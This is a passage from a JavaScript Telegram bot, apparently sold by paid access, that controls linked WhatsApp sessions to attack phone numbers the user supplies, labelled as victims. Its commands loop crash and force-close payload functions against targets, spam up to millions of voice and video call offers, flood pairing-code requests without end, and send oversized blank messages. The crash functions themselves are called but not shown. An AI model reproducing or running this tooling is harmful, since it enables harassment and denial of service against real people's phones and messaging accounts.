#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await invisSpam(sock, jid);
      await DelayHard(sock, jid);
      await sleep(500);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayinpis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 50; i++) {
      await Nukleotix(sock, jid);
      await sleep(700);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/forclose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCLOSE INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 10; i++) {
      await MakLoInpis(sock, jid);
      await sleep(10000);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCLOSE INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/fcall (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCLOSE CALL
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 20; i++) {
      await SpamcallFcPermanen(sock, jid);
      await sleep(1000);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/20 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCLOSE CALL
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blanksit (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK TYPE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 30; i++) {
      await superpowers(sock, jid);
      await systemui(sock, jid);
      await sleep(900);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK TYPE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/crashclick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : CRASH TYPE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      { parse_mode: "Markdown" }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 70; i++) {
      await ZhTForceCloseNew(sock, jid);
      await sleep(500);
      console.log(
        chalk.red(
          `[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
\`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @joyyyclod
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : CRASH TYPE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//------------------------------------------------------------------------------------------------------------------------------\\

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://ibb.co.com/bMFJgwG6", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Senzy😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
